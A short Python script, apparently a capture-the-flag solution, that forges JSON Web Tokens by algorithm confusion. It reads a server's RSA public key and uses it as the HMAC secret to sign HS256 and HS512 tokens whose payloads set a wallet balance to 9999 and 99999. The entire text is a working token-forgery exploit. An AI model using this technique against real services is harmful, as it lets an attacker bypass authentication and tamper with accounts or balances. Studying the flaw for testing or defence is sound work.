import jwt

# {"alg":"HS256","typ":"JWT"}
#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

public = open('public.pem', 'r').read()

#public = public.replace('\n', '').strip()

print(public)

print("------------------------")

print(jwt.encode({"bank":0,"rand":0,"wallet":9999}, key=public, algorithm='HS256'))

print("------------------------")

print(jwt.encode({"bank":0,"rand":0,"wallet":99999}, key=public, algorithm='HS512'))
